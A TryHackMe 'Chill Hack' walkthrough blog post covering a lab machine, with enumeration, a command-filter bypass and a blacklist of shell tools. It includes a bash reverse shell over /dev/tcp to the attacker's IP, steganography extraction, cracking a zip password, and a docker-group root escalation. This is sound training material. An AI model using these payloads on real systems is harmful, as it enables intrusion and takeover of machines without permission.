---
title: "Chill Hack"
date: 2022-08-30 14:00:40 +0530
categories: [TryHackMe, THM-Linux]
tags: [Machines,Linux,PASSWORD_CRACKING]
image: /assets/img/chillhack/profile.png
---


## Enumeration.
### nmap scanning.

**Command.**
``` 
sudo nmap -sC -sV -oN nmap-scan 10.10.65.68    
```

**Result .**
```
# Nmap 7.92 scan initiated Fri May 20 15:33:59 2022 as: nmap -sC -sV -oN nmap-scan 10.10.65.68
Nmap scan report for 10.10.65.68
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.11.230
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 20 15:34:36 2022 -- 1 IP address (1 host up) scanned in 37.08 seconds
```


### ftp login.

**Result.**
```
└─$ ftp 10.10.65.68
Connected to 10.10.65.68.
220 (vsFTPd 3.0.3)
Name (10.10.65.68:egovridc): Anonymous
331 Please specify the password.
Password: 
230 Login successful
```

**Listing files in ftp.**
```
ftp> ls 
229 Entering Extended Passive Mode (|||41965|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
```

**Downloading note.txt file and exit.**
```
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||46028|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |**********************************************************|    90        1.61 MiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.49 KiB/s)
ftp> quit
221 Goodbye.
```

**Reading note.txt.**
```
└─$ cat note.txt 
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

#### Gobuster scanning.

**Command.**
```terminal
 gobuster dir -u http://10.10.65.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-dir -t 40 2>/dev/null
```

**Results.**
```
└─$ cat gobuster-dir 
/images               (Status: 301) [Size: 311] [--> http://10.10.65.68/images/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.65.68/css/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.65.68/js/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.65.68/fonts/]
/secret               (Status: 301) [Size: 311] [--> http://10.10.65.68/secret/]
/server-status        (Status: 403) [Size: 276]
```

**There is a filtering in the website and some commands have been blacklisted.**
```php
<?php
        if(isset($_POST['command']))
        {
                $cmd = $_POST['command'];
                $store = explode(" ",$cmd);
                $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
                for($i=0; $i<count($store); $i++)
```
To bypass filter, then you have to escape the filtered commands with `\`

#### shell.

**Payload**
```
\bash -c 'exec \bash -i &>/dev/tcp/10.9.11.230/1234 <&1'
```

**On our netcat machine.**
```
www-data@ubuntu:/var/www/html/secret$ whoami
www-data
```

**We are in**
### User flag.

**List files**
```
www-data@ubuntu:/var/www$ ls
files  html
```

**navigating to files.**
```
www-data@ubuntu:/var/www/files/images$ ls
002d7e638fb463fb7a266f5ffc7ac47d.gif  hacker-with-laptop_23-2147985341.jpg
```

**hacker-with-laptop Image**

![image](/assets/img/chillhack/hacker-with-laptop.jpg)


**Sending image into local machine.**
```
└─$ wget http://10.10.65.68:8001/hacker-with-laptop_23-2147985341.jpg 

--2022-05-20 17:24:09--  http://10.10.65.68:8001/hacker-with-laptop_23-2147985341.jpg
Connecting to 10.10.65.68:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 68841 (67K) [image/jpeg]
Saving to: ‘hacker-with-laptop_23-2147985341.jpg’

hacker-with-laptop_23-2147985341.jpg       100%[===================>]  67.23K  63.2KB/s  in 1.1s    

2022-05-20 17:24:10 (63.2 KB/s) - ‘hacker-with-laptop_23-2147985341.jpg’ saved [68841/68841]                                                                         
└─$ ls
gobuster-dir  hacker-with-laptop_23-2147985341.jpg  nmap-scan  note.txt
```

**Extracting hidden files from the image.**
```
└─$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip". 
```

**Steghide shows that there is a zipped backup file inside the image.**
```
└─$ ls
backup.zip  gobuster-dir  hacker-with-laptop_23-2147985341.jpg  nmap-scan  note.txt
```

#### Extracting zipped file.

**zip2john**
```
└─$ zip2john backup.zip > backup.hash                                                                            
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8                                                                              

└─$ ls
backup.hash  backup.zip  gobuster-dir  hacker-with-laptop_23-2147985341.jpg  nmap-scan  note.txt
```

#### Brute-force to obtain password.

**john the ripper**
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2022-05-20 17:28) 3.225g/s 52851p/s 52851c/s 52851C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
 
**Found password as  ******\**

**unzip file and reading the source_code.php file.**
```
└─$ unzip backup.zip  
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php   
```

**File has the base64 stored password.**
```php
$password = $_POST["password"];
	if(base64_encode($password) == "REDACTED")
```

**Decryption of hash.**
```
└─$ echo ******* | base64 -d
*********    
```

### Escalating to user anurodh.

**user** 
```
www-data@ubuntu:/var/www/files/images$ su anurodh
Password: 
su: Authentication failure
www-data@ubuntu:/var/www/files/images$ su anurodh
Password: 
anurodh@ubuntu:/var/www/files/images$ whoami
anurodh
```

>hint
>
>If you check the id of the user  you will realize that he is within docker.
 

**Running `id` command.**
```
anurodh@ubuntu:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
anurodh@ubuntu:~$ ls
source_code.php
```

**Then i checked in [gtfobins](https://gtfobins.github.io/gtfobins/docker/). Then check root flag** 
```
anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# cd /root
# ls
proof.txt
# cat proof.txt	
```
 
#### user flag.

**User**
```
# cd /home
# ls
anurodh  apaar	aurick
# cd apaar
# ls
local.txt
# cat local.txt
{USER-FLAG: REDACTED}
```

**End.**